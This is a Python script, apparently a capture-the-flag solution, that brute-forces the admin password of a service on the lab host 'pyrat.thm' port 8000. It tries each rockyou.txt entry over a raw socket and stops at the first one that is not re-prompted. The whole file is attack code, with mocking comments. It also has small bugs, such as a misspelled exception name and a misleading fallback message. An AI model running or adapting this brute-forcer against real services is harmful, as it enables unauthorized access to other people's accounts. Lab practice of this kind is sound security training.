import socket
import sys

# Setting up the target

host = 'pyrat.thm'
port = 8000

# Setting up the wordlist
password_wordlist = "/usr/share/wordlists/rockyou.txt"

# Set up the exploit for admin password
def fuzz_password(password_wordlist):
    try:
        # Open our wordlist file
        with open(password_wordlist, 'r') as file:
             for password in file:
                 # Clean up all the new lines and junk so I don't get mad
                 password = password.strip() 
                 
                 # Establish connection on the server
                 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: 
                      s.connect((host, port))
                      
                      # Send the "admin" command so we can prompt for password
                      s.sendall(b'admin\n')
                      
                      # Receive the password prompt
                      response = s.recv(1024).decode().strip() 
                      
                      if "password" in response.lower():
                          s.sendall((password + '\n').encode())
                      
                          # Response after entering the password
                          response = s.recv(1024).decode().strip() 

                          # Check if password is correct or if it's still asking for  password
                          if "password:" in response.lower():
                              continue 
                          else:
                              print(f"Congrats the password is: {password}")
                              break
             else:
                 print("You suck no password prompt received")
    except FileNorFoundError:
        print("Llol use a real file n00b")
    except Exception as e:
        print(f"Error occurred {e}")
# Run it
fuzz_password(password_wordlist) 

